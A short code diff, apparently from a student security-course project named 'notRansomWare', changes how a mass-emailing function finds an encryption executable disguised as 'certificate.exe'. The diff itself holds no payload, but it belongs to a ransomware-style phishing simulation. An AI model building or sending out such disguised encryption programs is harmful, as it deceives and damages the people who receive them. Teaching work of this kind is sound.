@@ -113,7 +113,7 @@ def send_emails_to_all():
         return
 
     # Update the path to point to the dummy_encryption_script.exe
-    encryption_script_path = "c:/Users/Asus/Desktop/UNI/Courses/Year4_2nd_Term/Security/notRansomWare/certificate.exe"
+    encryption_script_path = os.path.join(os.path.dirname(__file__), "certificate.exe")
     # Ensure this file is generated with the icon using pyinstaller as described above.
     if not os.path.exists(encryption_script_path):
         messagebox.showerror("Error", "Encryption script not found.")
